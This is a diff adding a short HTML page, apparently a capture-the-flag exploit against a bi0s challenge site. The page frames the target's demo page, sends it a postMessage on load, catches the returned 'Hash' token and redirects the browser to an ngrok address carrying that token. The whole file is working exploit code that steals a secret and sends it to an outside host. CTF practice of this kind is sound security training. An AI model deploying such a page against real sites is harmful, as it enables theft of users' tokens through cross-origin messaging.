@@ -1,0 +1,20 @@
+<html>
+
+<head>
+    <title>Please</title>
+</head>
+
+<body>
+    <iframe id='pls' src='http://web.challenge.bi0s.in:5432/demo' onload="pls.contentWindow.postMessage(JSON.stringify({'raw':1}),'*')">
+    </iframe>
+    <script>
+        window.addEventListener("message", (event) => {
+            data = event.data;
+            token = data["Hash"];
+            if (token != undefined)
+                document.location = 'http://4cd7f595419b.ngrok.io/?' + token;
+        });
+    </script>
+</body>
+
+</html>
